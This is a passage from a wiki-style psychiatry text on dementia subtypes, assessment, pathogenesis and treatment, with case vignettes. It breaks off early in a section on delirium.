&amp; Cummings, 2008).  
* Vascular Dementias
Vascular dementia (VaD) is considered the third leading cause of dementia in the elderly, after DAT and Dementia with Lewy Bodies (Apostolova &amp; Cummings, 2008). However, some experts regard VaD as a heterogeneous syndrome, rather than a distinct disorder, in which the underlying cause is some type of cerebrovascular disease and the end result is dementia (Wright, 2007).  Several subtypes of VaD are recognized.  ''Multi-infarct dementia'' (MID)—the older term for VaD—involves multiple, relatively large infarctions, usually due to recurrent cerebral emboli originating from the heart, thromboembolic events, or atherosclerotic plaques. ''Single, strategically-placed infarct; lacunar state; ''and'' Binswanger\’s Disease'' (subcortical arteriosclerotic encephalopathy  (SAE) due to arteriosclerotic narrowing of deep penetrating white matter arterioles) are also considered VaD subtypes (see below). 
In partial contrast to DAT, vascular dementia often shows a ''subcortical pattern'', with prominent psychomotor slowing, executive dysfunction, and mood changes. Speech difficulties (dysarthria) are common. Compared with DAT, memory deficits in VaD are more often related to ''retrieval'' than to initial ''encoding ''of memories; for example, the patient with VaD may be unable spontaneously to &quot;retrieve&quot; the name of a recently specified object (such as &quot;chair&quot;), but can do so if provided a clue (&quot;It rhymes with hair&quot;). In contrast to the course of DAT, VaD of the multi infarct variety may have a &quot;stuttering&quot; course, with a ''stepwise progression'' of cognitive deterioration, often accompanied by lateralizing neurological deficits (Sadock &amp; Sadock, 2007). SAE often has an insidious course that may be temporally difficult to distinguish from DAT. The neurological findings of multi-infarct dementia may include focal findings such as weakness, spasticity, rigidity, and extensor plantar reflex (positive Babinski sign). Compared with DAT, VaD has a higher incidence and greater severity of ''new-onset depression, ''especially in older individuals; this is sometimes referred to as &quot;vascular depression.&quot; Psychosis is also relatively common in VaD. 
* Lewy Body Dementia 
Barely recognized only 20 years ago, Dementia with Lewy Bodies (DLB) is now believed to be the second most prevalent dementia of old age, accounting for some 15-20% of cases (McKeith et al, 1996). Compared with DAT, memory impairment in DLB is less pronounced, but ''cognitive fluctuations'' are severe. Variability in the patient\’s attention, alertness, and level of consciousness may reach the proportions of frank ''delirium'' (see below, Delirium). Recurrent ''visual hallucinations'' are also one of the hallmarks of DLB. DLB shares features with the dementia of ''Parkinson\’s Disease'' (PD), and diagnosis is conventionally determined by the temporal pattern of motor symptoms: if these precede cognitive decline by more than 12 months, PD is diagnosed, whereas motor symptoms occurring within a year of cognitive decline would be diagnosed as DLB (Apostolova &amp; Cummings, 2008). ''Bradykinesia, rigidity, resting tremor, ''and'' gait disturbance ''are commonly seen in DLB, but cases of DLB without extrapyramidal symptoms are reported. Other clues to the presence of DLB include a history of falls or syncopal episodes; REM (rapid eye movement) sleep behavior disorder (such as violent behaviors during REM sleep); and extreme sensitivity to neuroleptics and atypical antipsychotics (Apostolova &amp; Cummings, 2008; Jacobson et al, 2007—see under Treatment). 
* Fronto-temporal dementia

Fronto-temporal dementia (FTD) is actually a group of three related disorders, involving focal atrophy of the frontal and/or temporal lobes, accompanied by characteristic neurobehavioral impairments (Apostolova &amp; Cummings, 2008). So-called Frontal Variant FTD is also known as ''Pick\’s Disease'' and makes up the majority of FTD cases. (''Primary Progressive Aphasia'' and ''Semantic Dementia ''are less common FTD variants, and will not be discussed here). 
Patients with Frontal Variant FTD typically do not complain of cognitive problems to the same extent as patients with DAT; rather, they show insidious but profound alterations in personality, social skills, and impulse control. However, neuropsychological testing does reveal deficits in verbal fluency, abstract thinking and planning, and verbal memory, often with sparing of ''visual ''memory. Compared to DAT patients, those with FTD usually have more mood disturbance, behavioral disinhibition, and abnormal motor behavior. Curiously, nearly half of all FTD patients—two years after diagnosis--will show one or more stereotyped or obsessive-compulsive behaviors. These may include hand clapping, hoarding, and repetitive or ritualistic  behaviors (Mendez &amp; Perryman, 2002; Apostolova &amp; Cummings, 2008). Twenty per cent of FTD patients may develop a form of Kluver-Bucy Syndrome (hyperorality, hypersexuality, and abnormal exploratory behavior) two years after diagnosis (Mendez &amp; Perryman, 2002). 

''Case vignette: Mr. J. was a 57-year-old married white male, with a two-year history of marked &quot;change in personality&quot;, according to his wife. &quot;It\’s like night and day,&quot; she told the neurologist, &quot;compared to the way Fred used to be. He was the kindest, gentlest man I ever knew. Now, it\’s like Jekyll and Hyde—I\’m afraid to look at him cross-eyed, for fear he will scream at me, or worse.&quot; Mr. J. had always been a very empathic individual, but now seemed unconcerned with the wishes or needs of others. His hygiene and personal grooming had deteriorated over the past year, and he had begun to engage in bizarre rituals every morning; for example, counting to 100 before getting out of bed, then eating exactly six large muffins, without saying a word to his wife. Most of the time, Mr. J. seemed &quot;flat&quot; and apathetic; however, when his wife questioned any of his actions, he would shout at her or throw some object across the room. ''
''A neurological evaluation found evidence of significant frontal lobe dysfunction and positive &quot;grasp reflex&quot;, but was otherwise within normal limits. ''
* Miscellaneous Dementia Syndromes

In addition to the aforementioned types of dementia, about 5% of patients will have dementia due to miscellaneous causes, including 
''Huntington\’s Disease, Creutzfeld-Jakob Disease,  Parkinson\’s Disease, HIV infection'', and other conditions''.  Huntington\’s Disease'' (HD)—an autosomal dominantly-transmitted, progressive disorder—has its peak onset in the fourth and fifth decade, though a smaller peak occurs in the 20s. The classic presentation for HD is a combination of ''chorea and dementia'', in the setting of a positive family history; however, the earliest presentation may be with ''affective'' or ''psychotic ''symptons (Lerner &amp; Riley, 2008). A &quot;tendency toward suicide&quot; in HD was recognized by Huntington himself, and suicidal ideation may be the presenting problem. ''Creutzfeld-Jakob Disease'' (CJD) is caused by an abnormal protein called a ''prion'', and typically presents as a rapidly-progressive dementia, accompanied by ataxia and multi-focal myoclonic jerks. A third of patients with CJD show a prodrome of fatigue, headache, insomnia, malaise, or depression (Apostolova &amp; Cummings, 2008). Dementia due to ''Parkinson\’s Disease'' (PD) occurs in roughly 30% of patients with PD, with a larger percentage afflicted as age increases (Lerner &amp; Riley, 2008). However, cognitive symptoms can occur at any stage of PD, and are often characterized by slowed mentation (bradyphrenia), impaired visuo-spatial skills (such as facial recognition and operating objects in space) and executive dysfunction. Affective disturbance—especially depression—is very common in PD, and may be present in over 60% of cases. Anxiety is also commonly seen in PD, although less frequently than depression (Lerner &amp; Riley, 2008). Psychosis is also encountered in PD, usually related to dopaminergic effects of anti-Parkinsonian medication (Lerner &amp; Riley, 2008). 
 Cognitive deficits associated with ''HIV infection'' are considered part of a continuum, known as ''HIV-1-associated cognitive-motor complex (HCMC). ''Frank HIV dementia is the most serious form of HCMC, and occurs in roughly 30% of HIV-infected individuals (Fernandez &amp; Tan, 2008). The ''early'' clinical picture in HCMC is usually characterized by ''subcortical'' features (see Table 1), including reduced information processing speed; motor slowing or dyscoordination; and depressed mood. However, as the illness progresses, more classically &quot;cortical&quot; features may develop, including aphasia, agnosia, apraxia, and frontal lobe symptoms (Fernandez &amp; Tan, 2008). Behavioral disinhibition, mania, and psychotic features are often found in the later stages of HIV-associated dementia. 


'''Assessment and Diagnostic Testing'''

'''	'''In addition to obvious abnormalities in the ''mental status exam'', the patient with dementia may show a variety of deficits on more sophisticated ''screening instruments'' and  ''neuropsychological assessments'', and on ''neuroimaging'' studies. 
* Prototypical mental status findings in dementia 
Considering the diverse subtypes of dementias, it is difficult to generalize about findings on mental status exam. Furthermore, the clinician must proceed with the caveat that a patient cannot be diagnosed with dementia, in the presence of active ''delirium'' (see Delirium, section  ). Nonetheless , if we &quot;average out&quot; the differences between cortical and subcortical dementia presentations, the following mental status exam could be considered typical of the patient with ''moderately severe dementia'': 
''The patient appears alert, but apathetic and somewhat agitated, and is seen to be twisting her fingers through her hair. Her speech is fluent and well-articulated, but she uses many long, meaningless phrases (such as, &quot;The thing of it is, you see, I need the thing to be, you know, whatever.&quot;). She is oriented to year, but not the month or day. She recalls only 1 of three named items, after a three minute interval of distraction. She cannot remember the names of the college from which she graduated, and gave an incorrect response when asked, &quot;Who is the current president of the U.S.?&quot; When shown a picture of a cup, she calls it a &quot;vase&quot;, and identifies the examiner\’s stethoscope as a &quot;hearing aid&quot;. She is able to subtract 10 from 100 correctly, but cannot do serial 10\’s accurately (&quot;90, 85, 75, 65, 50, 40…&quot;). She produces a poorly-constructed drawing when asked to copy a cube, and her drawing of a clock reading &quot;ten past two&quot; was incorrect (with the big hand placed at the &quot;10&quot; position). When asked to interpret the proverb, &quot;The early bird catches the worm,&quot; her response is very concrete (&quot;The bird that gets up early will catch the worm.&quot;). When asked if she has any particular fears lately, she replies, &quot;I don\’t know what the neighbors think of me, but I know they steal from my bedroom.&quot;'' (Spitzer et al, 1994). 
* Screening instruments and  neuropsychological assessments
The most widely-used screening instrument for dementia is the Mini-Mental State Exam (MMSE) developed by Folstein ( Folstein et al, 1975), an 11-item test that evaluates orientation, registration, attention and calculation, recall, and language. The maximum score on the MMSE is 30 and—depending on age and education--a score of 28 or higher is usually considered &quot;normal.&quot; A &quot;low normal&quot; score (24 or higher) appears to predict development of dementia after three years (Braekhus et al, 1995). The MMSE does not specifically examine executive cognitive function. An expanded version of the MMSE (the 3MS) does include some executive function items, and may be more sensitive, specific and predictive of functional outcome than the MMSE (Grace et al, 1995). Neither the MMSE nor the 3MS is ideally suited to detecting features of &quot;milder&quot; or subcortical dementia, or detecting impairments in social or operational functioning. For HIV-related dementia, the HIV dementia scale or the Mental Alternation Test may be better alternatives (van Harten et al, 2004; Billick et al, 2001). More complete neuropsychological assessment of dementia usually includes use of the Wechsler Adult Intelligence Scale-III (WAIS-III), the Wechsler Memory Scale (WMS), the Rey Complex Figure, and Trail Making Test (Howieson &amp; Lezak, 2008), among others. These ancillary tests may be helpful in pinpointing specific functional impairments and their neuroanatomical correlates. 

* '''Neuroimaging studies'''

Neither the ICD-10 nor the DSM-IV criteria for dementia require any corroborative evidence obtained from neuroimaging studies. Nevertheless, neuroimaging techniques such as magnetic resonance imaging (MRI) or postitron emission tomography (PET) may be helpful in clarifying diagnosis and ruling out other types of brain disease, such as normal pressure hydrocephalus. Indeed, the American Academy of Neurology recommends a non-contrast structural image (CT or MRI) in the initial evaluation of cognitive impairment (Apostolova &amp; Cummings, 2008). With DAT, global cerebral atrophy, especially in mesial temporal and parietal regions, is the usual finding on CT or MRI. On PET or SPECT (single-photon emission computed tomography), DAT patients usually show bilateral hypometabolism in mesial temporal and parietal regions. Recently, a novel radio-labeled PET imaging agent, ''18F-AV-45'', has been developed, and may eventually provide a practical approach for routine brain imaging for Alzheimer\’s Disease (Alzheimer\’s Association, 2008). 
In dementia with Lewy Bodies (DLB), bilateral parietal and ''occipital ''hypoperfusion is seen. The latter helps distinguish DLB from DAT, and may explain the high prevalence of ''visual ''hallucinations in DLB. Structural imaging (CT, MRI) is not helpful in diagnosing DLB (Lerner &amp; Riley, p. 919). In frontotemporal dementia (FTD), the expected hypometabolism is seen in frontotemporal regions, using PET scanning (Apostolova &amp; Cummings, 2008). Structural imaging (such as MRI) shows distinct profiles for the three main subtypes of FTD, though some degree of frontal and/or temporal lobe involvement is seen in all three subtypes.
In vascular dementia, both CT and especially MRI can be useful in defining cortical and white matter abnormalities.  In multi-infract or lacunar states, evidence of prior infarct can be seen. In SAE, periventricular white matter abnormalities can frequently be seen, although limited periventricular abnormatilies just anterior or proximal to the lateral ventricle can also be seen in normal aging.  Periventricular abnormalities of greater size or distance from the ventricles, or extending into the centrum semiovale, are more likely to represent evidence of clinically significant disease.  
* '''Investigational Biomarkers'''
Given the uncertainties of early dementia diagnosis, there has been great interest in a &quot;blood test&quot; or other valid biomarker for DAT, the most common type of dementia. Recently, for example, researchers in Germany found differences in levels of ''CD-69'', a protein involved in white blood cell growth and production, in normal subjects versus those with DAT or Parkinson\’s-related dementia (Alzheimer\’s Association, 2008). Irish researchers have focused on the enzyme ''beta-secretase'' (BACE1) activity in the brain. (BACE1 is one of two enzymes involved in the pathological processing of ''amyloid precursor protein'' (APP)—see below, under Pathogenesis).   High levels of BACE1 in the spinal fluid appear to be correlated with development of DAT. At present, these remain promising, but only investigational, techniques (Alzheimer\’s Association, 2008).

'''Pathogenesis of Dementias'''

* '''Biogenetic determinants and pathophysiology'''
''Dementia of the Alzheimer Type''
''	''
From the biogenetic standpoint,'' ''Alzheimer\’s Disease (DAT) appears to be of two main types: ''late-onset'' (sporadic) and ''early-onset''. When DAT begins after age 65 (late onset), its mode of inheritance appears to involve a constellation of genes, probably influenced by epigenetic factors (i.e., influences that do not change DNA sequence) such as diet and exercise. However, increasing age is the most important risk factor, with rates of DAT rising to 40% in those 85 years or older. Increasing age acts synergistically with the ''apolipoprotein E'' (APOE) ''gene polymorphism'' on chromosome 19. The APOE gene takes three major forms (''alleles''), termed ''ApoE2'', ''ApoE3'', and ''ApoE4''. APOE4 (E4) greatly increases the likelihood of late-onset DAT; i.e., individuals with two E4 genes develop DAT eight times more frequently than do those with no E4 gene. (Sadock and Sadock, 2007 p. 330; Apostolova &amp; Cummings, 2008). It appears that E4 promotes ''aggregation of amyloid β'' (Aβ), which leads to a variety of pathological changes in brain tissue (see below). 
In ''early-onset'' DAT, instead of—or possibly in addition to—APOE4, three ''autosomal dominant mutations'' appear to be important: the APP gene mutation on chromosome 21; the presenilin-1-gene mutation on chromosome 14; and the presenilin-2 gene mutation on chromosome 1. As noted above, early-onset DAT may be associated with atypical features, as well as shorter survival time (Apostolova &amp; Cummings, 2008).   
The classic pathological findings in DAT is the presence of ''senile plaques, neurofibrillary tangles, neuronal and synaptic loss'', and'' granulovascular degeneration of neurons'' (Sadock &amp; Sadock, 2007, p. 330). The pathophysiology of DAT is integrally related to the over-production or accumulation of ''amyloid β'' (Aβ). The \’amyloid cascade hypothesis\’ of DAT posits that abnormal enzymatic processing of ''beta-amyloid precursor protein'' (βAPP) leads to overproduction of neurotoxic Aβ peptides. These abnormal peptides polymerize (form chains) and &quot;clump together&quot;, forming several types of destructive, extracellular inclusion bodies called ''plaques''. The first plaques appear in temporal-occipital association regions in patients with DAT. In addition, DAT may involve abnormal phosphorylation of a structural protein called ''tau'', which is involved in microtubulular transport—the intracellular &quot;highway system&quot; that transports vital constituents within neurons (Apostolova &amp; Cummings, 2008). In DAT, hyper-phosphorylated tau forms distructive intracellular inclusions called ''neurofibrillary tangles'' (NFTs).  Together, these plaques and tangles &quot;choke off&quot; normal neuronal function and neurotransmitter production in DAT, particularly affecting the production of ''acetylcholine'' (ACh) and norepinephrine. Degeneration of cholinergic neurons is present in the ''nucleus basalis of Meynert'' in persons with DAT, and low brain levels of ACh and choline acetyltransferase are also found. Cholinergic deficits provide the rationale for use of ''cholinesterase inhibitors'' in the treatment of DAT (see below, Treatment). In addition, overactivation of NMDA receptors by the excitatory neurotransmitter, ''glutamate'', is believed to play a role in DAT, and is the basis for one pharmacological treatment (see below re: memantine). Recently, it was discovered that elevated serum levels of ''amyloid β ''are associated with reduced cognitive function even in healthy older adults, similar to patterns observed in early DAT (Gunstad et al, 2008). 

''Vascular Dementia ''
	VaD is caused by cumulative ischemic or hemorrhagic brain damage, usually secondary to cerebrovascular and cardiovascular pathology, and is often seen in association with hypertension, diabetes and hyperlipidemia (Apostolova &amp; Cummings, 2008). There are somewhat conflicting data regarding the contribution of the ApoE gene to the pathogenesis of VaD, but any such contribution appears smaller than that in DAT (Higuchi et al, 1996). 
''Multi-infarct dementia'' (MID)—the older term for VaD—usually involves infarcts in the territory of the ''middle cerebral artery'' and surrounding (&quot;watershed&quot;) regions. The middle cerebral artery is the largest cerebral artery and is the vessel most commonly affected by cerebrovascular accident. It supplies most of the outer convex brain surface, nearly all the basal ganglia, and the posterior and anterior internal capsules (Slater, 2008). In VaD, infarcts are also seen in the basal ganglia and periventricular white matter.
 Subacute Arteriosclerotic Encephalopathy (SAE) and ''Lacunar state'' both involve the small vessels of the brain. SAE is caused by thickening and narrowing (arteriosclerosis) of arteries that feed subcortical areas of the brain. SAE produces widespread, microscopic areas of damage to the deep layers of ''white matter.'' (NINDS, 2008). ''Lacunar state'' (lacunar disease) is due to occlusion of small, penetrating cerebral arteries, leading to  extremely small but deep infarctions (''lacunes''). Sometimes, these lacunes are so small as to produce no obvious deficits, or only pure motor or sensory deficits (Robinson &amp; Starkstein, p. 707). Lacunar state is often associated with hypertension and/or diabetes. The cavitary lesions (lacunae) characteristic of this condition are often found in the internal capsule, deep grey matter nuclei, and white matter. 
''Cerebral autosomal dominant arteriopathy with subcortical infarcts and leucoencephalopathy'' (CADASIL) is a rare, hereditary type of VaD that affects small blood vessels in the brain. An abnormality in the muscle cells surrounding these blood vessels gradually destroys the blood vessel cells. This may lead to migraines, emotional disturbance, stroke-like episodes, dementia, and other impairments (CADASIL Foundation, 2008).  CADASIL involves mutations of the Notch 3 gene on chromosome 19 (Joutel et al, 1996). There are also a growing number of genetically uncharacterized but familial small vessel diseases (Low et al, 2007). 

''Dementia with Lewy Bodies (DLB)''
	DLB does exist in genetic forms, including some autosomal dominant forms (Lerner &amp; Riley, p. 919).  There is significant pathophysiological overlap between DLB and Parkinson\’s Disease (PD), on the one hand; and DLB and SDAT, on the other. Thus, ''alpha-synuclein'' is a protein that appears to modulate synaptic transmission, and constitutes the major component of ''Lewy bodies''. These structures are the pathological hallmark of both PD and DLB, whether of a sporadic or familial origin (Lerner &amp; Riley, p. 914). 
There is considerable overlap between DLB and DAT. For example, ''neuritic plaques'' and ''neurofibrillary tangles'' are seen in autopsy studies of both DAT and DLB, though fewer neurofibrillary tangles are found in DLB (Samuel et al, 1997). Moreover, ''amyloid β'' (Aβ) pathology—one of the hallmarks of DAT—is often seen in DLB. Indeed, there is an interesting synergy between pathophysiological elements of DLB and DAT. For example, alpha- synuclein is a potent inducer of tau fibrillization, while Aβ  has been shown to promote Lewy body pathology in animal models (Giasson et al, 2003; Masliah et al, 2001). 

''Fronto-temporal dementia ''

	There appears to be a strong genetic loading in FTD. About 40% of FTD patients have a family history of a similar disorder in close relatives, and in the vast majority of cases, there is an autosomal dominant inheritance pattern. Autosomal dominant mutations in the ''tau'' gene on chromosome 17 have been discovered in FTD, and—like DAT-- FTD is generally considered a &quot;tauopathy.&quot; However, &quot;tau-negative&quot; forms of FTD have been described, including one form that often presents with concomitant ''amyotrophic lateral sclerosis ''(ALS) (Apostolova &amp; Cummings, 2008; Lantos &amp; Cairns, 2001). 
Pick\’s Disease (frontal variant FTD) produces striking frontal, temporal, or combined (fronto-temporal) atrophy. Microscopically, the hallmark are  spherical, tau-based inclusion bodies, termed ''Pick\’s bodies'', which may be seen in neurons and glial cells. Neuronal loss and swelling are also commonly seen in Pick\’s Disease. In tau-negative forms of FTD, neuronal loss, gliosis, and microvacuolation are the sole microscopic findings. 

* '''Ethno-cultural and racial factors in dementia'''

Ethnic, cultural, and racial factors play a role in the assessment of dementia and, to some extent, on its course and outcome. For example, most diagnostic tests for dementia are based on cognitive assessments not yet validated for various ethnic groups. Moreover, emigration of some ethnic groups may affect dementia prevalence, as demonstrated by higher rates of dementia among Japanese-Americans than among Japanese cohorts in Japan (Iliffe &amp; Manthorpe, 2004). Ethnic and cultural factors may also affect caregiver attitudes and behavior. For example, Latina dementia caregivers may delay institutionalization significantly longer than female Caucasian caregivers, perhaps reflecting more tolerant Latino cultural attitudes toward caregiving (Mausbach et al, 2004). Similarly, Shaw et al (1997) found lower rates of depressive symptoms in Chinese, as compared with American, caregivers of demented patients, possibly reflecting greater acceptance of traditional family roles among the Chinese subjects. Finally, ethnicity and race may play a role even in the symptomatic expression of dementia, with different ethnic and racial groups showing varying rates of aggressive behaviors, wandering, and hallucinations (Sink et al, 2004). 

'''Treatment of Dementias'''
'''	'''''Pharmacotherapy''

''	''By far the most experience with pharmacotherapy has been in patients with DAT, and our discussion necessarily focuses on this condition. The mainstay of drug therapy in dementia is a group of agents called ''cholinesterase inhibitors'' (CIs), including donepezil, galantamine, and rivastigmine. (Another CI, tacrine, is rarely used nowadays in most industrialized countries, owing to its hepatotoxic effects). Comprehensive discussion of these agents may be found in Jacobson et al, 2007. All CIs act to inhibit the enzyme ''acetylcholinesterase'', which metabolizes the neurotransmitter, acetylcholine. Rivastigmine also inhibits butyrylcholinesterase, and galantamine is an allosteric modifier of the nicotinic acetylcholine receptor. There is no convincing, randomized, controlled evidence showing any one of these drugs as markedly superior to the others. Indeed, the efficacy of this group of agents appears to be modest-to-moderate, with most studies of DAT finding that the CIs mainly slow the rate of cognitive decline and/or delay nursing home placement.  One meta-analysis of 13 randomized, double blind, placebo controlled trials demonstrated that 6-12 months of treatment with donepezil, galantamine or rivastigmine in mild, moderate or severe DAT produced about a 3 point drop in scores on the 70-point ADAS-Cog Scale. Benefits were also seen on measures of activities of daily living and behavior. But as the authors note, &quot;none of these treatment effects (is) large.&quot; (Birks, 2006). The other drug used in most countries for DAT is ''memantine'', which blocks the action of glutamate at the NMDA receptor, under conditions of excessive glutamate activity (Jacobson et al, 2007). This is thought to slow neurodegeneration in DAT, and there is evidence of memantine\’s benefits in moderate-to-severe DAT. In some instances, memantine may be combined with one of the CIs, but long-term data on outcome are few. 
Although atypical ''antipsychotics'' are often used—and sometimes, overused—in patients with DAT, they are not without risk in dementia-prone populations, particularly when ''vascular risk factors'' are present. In the U.S., the Food &amp; Drug Administration (FDA) issued, in June 2008, an advisory to physicians, stating the following (FDA, Alert, 6/16/08):

\*  Elderly patients with dementia-related psychosis treated with conventional or atypical antipsychotic drugs are at an increased risk of death.

    \* Antipsychotic drugs are not approved for the treatment of dementia-related psychosis.  Furthermore, there is no approved drug for the treatment of dementia-related psychosis.  Healthcare professionals should consider other management options.

* Physicians who prescribe antipsychotics to elderly patients with dementia-related psychosis should discuss this risk of increased mortality with their patients, patients\’ families, and caregivers.

Notwithstanding these serious concerns, some patients with DAT and psychotic features and/or severe behavioral disturbance (e.g., extreme agitation or aggressive violence) may require and benefit from low doses of atypical antipsychotics; e.g., risperidone 0.5 mg/day or olanzapine 5 mg/day (Alexopoulos et al, 2004).  However, attempts at behavioral modification (see below) and alternative therapies (such as the SSRI ''citalopram'') should be considered (Pollock et al, 2007). As a recent review by Ellison (2008) put it: 

&quot;…several of the atypical antipsychotics remain reasonable choices when used in patients whose vascular risk factors do not outweigh their behavioral treatment needs. The atypical antipsychotics have not been proved to control agitation over an extended period of time and should be used at the lowest effective doses and for the shortest interval necessary, with sufficient psychoeducation and disclosure of risks to caregivers and relatives.&quot;

	Treatment of vascular dementia (VaD) should first focus on mitigation of known risk factors, such as hypertension, diabetes, atrial fibrillation, and hyperlipidemia. Studies regarding use of CIs for vascular dementia are plagued by methodological problems, such as inclusion of those whose dementia probably involves some DAT-type pathology and cholinergic system dysfunction; nonetheless, there is modest and growing evidence that the CIs may be helpful in subgroups of patients with VaD. Similarly, Dementia with Lewy Bodies (DLB) also involves reduction of brain acetylcholine—perhaps surpassing those seen in DAT--and the CIs may sometimes be useful in DLB (Jacobson et al, 2007; ). Patients with DLB are exquisitely sensitive to the extrapyramidal side effects of antipsychotics, and both typical and atypical agents (with the possible exception of clozapine) are generally to be avoided in DLB patients.  

''Psychosocial and behavioral interventions''


''	''Whenever possible, the clinician should initiate non-pharmacological interventions when managing behavioral disturbances in patients with dementia. Such behavioral approaches are aimed at ameliorating physical, environmental and psychosocial stressors that may lead to agitation, pacing, aggression, and related behavioral disturbances (Salzman et al, 2008). For example, dysfunctional verbal and physical behaviors—such as repetitive shouting, pacing, punching, etc.—may reflect unrecognized pain, loneliness, depression, boredom, or other social stressors. A variety of behavioral interventions may be helpful in this context; e.g., structured socialization, &quot;pet therapy&quot;, viewing family videotapes, and training programs for family caregivers. It is also important to review the patient\’s medical status and medications, since adverse drug effects or interactions may sometimes contribute to confusion and agitation (Jacobson et al, 2007; Salzman et al, 2008). There are relatively few well-controlled studies of non-pharmacological interventions in dementia; nevertheless, a number of promising investigational approaches are under investigation, including aroma therapy and music therapy (Raglio et al, 2008). 

	''Special Populations''

There are several subgroups of demented patients who merit special attention and interventions. Patients with ''HIV-related dementia'' in the late stages, for example, may exhibit behavioral disinhibition, mania, and psychotic features, such as delusions and hallucinations. Primary treatment of HIV/AIDs is aimed at suppression of viral load by means of anti-retroviral therapies. Some evidence suggests that the nucleoside analog reverse transcriptase inhibitor (NRTI) ''zidovudine'' (also known as AZT) may attenuate the symptoms of HIV-related dementia and neurological impairment in some patients; however, zidovudine and related agents may themselves provoke ''neuropsychiatric complications'', such as depersonalization, mania, and delirium (Fernandez &amp; Tan, 2008). Cognitive functioning in HIV dementia patients may be improved by methylphenidate; psychotic symptoms may respond to atypical antipsychotics, such as risperidone or olanzapine. Depression in HIV/AIDS is not uncommon, but may stem from a complex mix of direct effects of HIV on the CNS, and psychosocial factors. 
Antidepressants such as citalopram and escitalopram may be useful, but this patient population is particularly susceptible to drug-related side effects and interactions. Thus, any pharmacotherapy aimed at neuropsychiatric symptoms must be very carefully monitored in this population (Fernandez &amp; Tan, 2008).
As noted above, ''Dementia with Lewy Bodies'' (DLB) poses particular management problems. Psychotic symptoms, including visual hallucinations, are a central feature of DLB, and the sensitivity of these patients to antipsychotics makes treatment especially challenging. Cholinesterase inhibitors, such as rivastigmine, may ameliorate some neuropsychiatric symptoms in DLB patients, including hallucinations, paranoid delusions, apathy, aggression, and agitation (Simard &amp; van Reekum, 2004; Apostolova &amp; Cummings, 2008). If an antipsychotic must be used in DLB with psychosis, classic neuroleptics should be avoided; initiating treatment with very low doses of quetiapine or clozapine is sometimes warranted (Jacobson et al, 2007). 
''Depression'' as a feature of dementia represents a diagnostic and treatment challenge. As noted earlier, depression is commonly seen in patients with Parkinson\’s Disease, Huntington\’s Disease, DAT, and LBD, as well as in those with a history of stroke or other form of VaD. Depression may represent a prodrome to dementia or a feature of established dementia. The recently described ''amyloid-associated depression'' may represent such a prodome in DAT (Qiu et al 2008).  ''Vascular depression'' (Sneed et al, 2008, Alexopolous, 2006) may present as new-onset of depressive illness in those affected by diffuse or focal vascular lesions, and is increasingly recognized in older individuals. Conversely, the &quot;dementia of depression&quot; (formerly called ''depressive pseudodementia'') is a reversible cognitive impairment directly related to the patient\’s mood disorder. Features such as ''excessive guilt, low self-esteem, self-loathing, or persistent suicidal ideation'', as well as ''delayed responses to cognitive questions,'' are useful &quot;red flags&quot; for the presence of depression in dementia. The Cornell Scale for Depression in Dementia may be helpful in detecting this problem. Depressed patients with dementia often respond to lower doses of antidepressants (such as citalopram or sertraline) than do non-demented depressed patients (Jacobson et al, 2007).  
''Delirium'' is a common complication of both HIV-related dementia and DLB, and is discussed in the section on Delirium. Co-morbid dementia and delirium is also discussed in the section on Delirium. 
''Case Vignette: Mr. J. was a 78-year-old nursing home patient with dementia of the Alzheimer type (DAT). The staff were concerned and distressed by Mr. J\’s frequent &quot;moaning&quot; or &quot;yelling&quot;, particularly in the evening, and believed these behaviors were adversely affecting the other residents of the home. Mr. J. was prescribed risperidone 1.0  mg at h.s. His yelling diminished after only two days of treatment. However, he developed significant orthostatic  hypotension and akathisia, and continued to &quot;moan&quot; nearly every night. A comprehensive medical evaluation revealed that Mr. J. suffered from severe osteoarthritis, which was worsened with attempts by the &quot;night shift&quot; nurses to reposition Mr. J. in his bed. A combination of acetaminophen and local heat application led to considerable relief and marked reduction in Mr. J\’s verbal outbursts. ''  
''Risperidone was reduced to 0.25 mg at h.s., with significant improvement in Mr. J\’s akathisia and hypotension''. 

'''DELIRIUM'''

'''Phenomenology (Characteristic Features of Delirium)'''

Delirium may be defined as ''an acute or subacute disturbance in cerebral functioning leading to impairment in one\’s level of consciousness, orientation, memory, and attention'', usually characterized by &quot;waxing and waning&quot; over hours or days. Common accompaniments of delirium include altered sleep-wake pattern; labile mood; speech disturbance; restlessness or agitation; perceptual abnormalities; and sometimes, psychotic features. Older terms for delirium include &quot;acute organic brain syndrome,&quot; &quot;cerebral insufficiency,&quot; and &quot;acute confusional state.&quot; Not uncommonly, delirium may be superimposed on dementia, a condition sometimes termed &quot;beclouded dementia&quot; (Sadock &amp; Sadock, 2007). 

''Epidemiology''
Delirium is a very common problem, particularly in emergency, medical-surgical, inpatient, and geriatric settings, such as nursing homes (Levkoff et al, 1991). Substance-abuse and oncology treatment centers also have high rates of delirium (Tasman et al, 1998). Among medical inpatients, the prevalence of delirium ranges from 11-16%, while among elderly patients admitted for acute hospital care, the prevalence ranges from 24-65%. Among elderly patients over age 65, hospitalized for a general medical condition, 10-15% will develop delirium while in the hospital. In general delirium tends to be more common among the very young and the very old, but can affect anyone at any age. Delirium is associated with longer hospital length of stay and mortality in medical surgical inpatients.

''Subtypes of Delirium and Classification''

	Delirium is sometimes characterized according to the predominant disturbance in motor behavior; i.e., as ''excited'' (&quot;hyperactive&quot;), ''lethargic ''(&quot;hypoactive&quot;) or ''mixed'' delirium (Trzepacz &amp; Meagher, 2008). Some evidence indicates that these motor subtypes have implications for etiology, pathophysiology, presence of non-motor symptoms, and prognosis. Thus, some evidence suggests that patients with hyperactive delirium may have a better prognosis and a lower mortality rate. Hypoactive delirium may be more likely to go undetected, as one might expect from the lack of obvious agitation. However, the definition of these subtypes varies considerably among clinicians and researchers, and their reliability has been questioned. 
Another way of considering delirium is expressed by the terms &quot;excitatory&quot; and &quot;inhibitory&quot; syndromes, which we will discuss under Pathogenesis (Ferner, 2003). 
Delirium with ''psychotic features''—including delusional misidentification and hallucinations—may be particularly distressing to the patient, even after resolution of the delirium (Trzepacz &amp; Meagher, 2008). 
	There are several ways delirium may be classified. In the ICD-10 (1993), the main categories are:
# [Delirium, Not Induced By Alcohol And Other Psychoactive Substances-http://www.mentalhealth.com/icd/p22-or01.html] 
# [Delirium, Not Superimposed On Dementia, -http://www.mentalhealth.com/icd/p22-or01.html] 
# [Delirium, Superimposed On Dementia-http://www.mentalhealth.com/icd/p22-or01.html] 
# [Other Delirium-http://www.mentalhealth.com/icd/p22-or01.html] 
